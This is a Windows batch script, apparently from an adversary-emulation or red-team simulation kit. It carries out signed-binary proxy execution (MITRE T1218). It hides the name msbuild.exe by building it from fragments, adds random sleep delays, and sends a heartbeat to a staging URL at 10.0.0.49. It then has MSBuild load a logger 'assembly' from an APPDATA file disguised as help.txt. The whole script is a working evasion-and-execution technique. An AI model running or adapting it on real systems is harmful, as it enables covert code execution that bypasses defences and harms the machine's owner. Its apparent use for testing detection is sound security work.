@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET txisnba=%APPDATA%\8636\06ec9fce
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8636-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=help.txt
SET dvhhyc=8636
SET zfcddx=%APPDATA%\!rrocubc!\macula-simulations.log
SET fscbsx=%WINDIR%\Microsoft.NET\Framework\v4.0.30319\

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_start=1>> "!zfcddx!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete=1>> "!zfcddx!" 2>nul

SET aszxc=1
SET xcvfrr=
SET /A delay=%RANDOM% %% 20 + 10
timeout /t !delay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_!delay!s=1>> "!zfcddx!" 2>nul

SET r1=ms
SET r2=bu
SET r3=il
SET r4=d.
SET r5=ex
SET r6=e
SET vsdasd=!r1!!r2!!r3!!r4!!r5!!r6!
SET qqplb=!fscbsx!!vsdasd!

curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_sent=1>> "!zfcddx!" 2>nul
ping -n 8 127.0.0.1 >nul

SET n1=Lo
SET n2=gg
SET n3=er
SET n4=En
SET n5=tr
SET n6=y
SET rsapx=!n1!!n2!!n3!!n4!!n5!!n6!

"!qqplb!" /logger:!rsapx!,"!txisnba!\!xzanpex!";MyParameters,Foo
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: msbuild_executed=!ERRORLEVEL!>> "!zfcddx!" 2>nul

SET isdnn=1
SET kjsaad=
IF !ERRORLEVEL! NEQ 0 SET isdnn=0&SET kjsaad=exitcode_!ERRORLEVEL!
SET logline=[!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!isdnn!:!kjsaad!
echo !logline!>> "!zfcddx!" 2>nul
CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_end=1>> "!zfcddx!" 2>nul